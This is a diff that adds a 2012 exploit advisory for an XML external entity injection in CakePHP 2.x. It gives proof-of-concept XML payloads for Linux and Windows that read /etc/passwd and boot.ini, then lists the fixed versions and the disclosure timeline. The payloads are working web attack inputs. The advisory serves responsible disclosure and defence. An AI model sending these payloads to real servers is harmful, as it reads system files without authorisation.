@@ -1,0 +1,41 @@
+# Exploit title: CakePHP XXE injection
+# Date: 01.07.2012
+# Software Link: http://www.cakephp.org
+# Vulnerable version: 2.x - 2.2.0-RC2
+# Tested on: Windows and Linux
+# Author: Pawel Wylecial
+# http://h0wl.pl
+1. Background
+
+Short description from the project website: "CakePHP makes building web applications simpler, faster and require less code."
+
+2. Vulnerability
+
+CakePHP is vulnerable to XML eXternal Entity injection. The class responsible for building XML (it uses PHP SimpleXML) does allow local file inclusion.
+
+3. Proof of Concept
+
+Linux:
+<!DOCTYPE cakephp [
+  <!ENTITY payload SYSTEM "file:///etc/passwd" >]>
+<request>
+  <xxe>&payload;</xxe>
+</request>
+
+Windows:
+<!DOCTYPE cakephp [
+  <!ENTITY payload SYSTEM "file:///C:/boot.ini" >]>
+<request>
+  <xxe>&payload;</xxe>
+</request>
+
+4. Fix
+
+Fix applied in version 2.2.1 and 2.1.5. See official security release:
+http://bakery.cakephp.org/articles/markstory/2012/07/14/security_release_-_cakephp_2_1_5_2_2_1
+
+5. Timeline
+
+1.07.2012 - vulnerability reported
+13.07.2012 - response from CakePHP
+14.07.2012 - confirmed and fix release
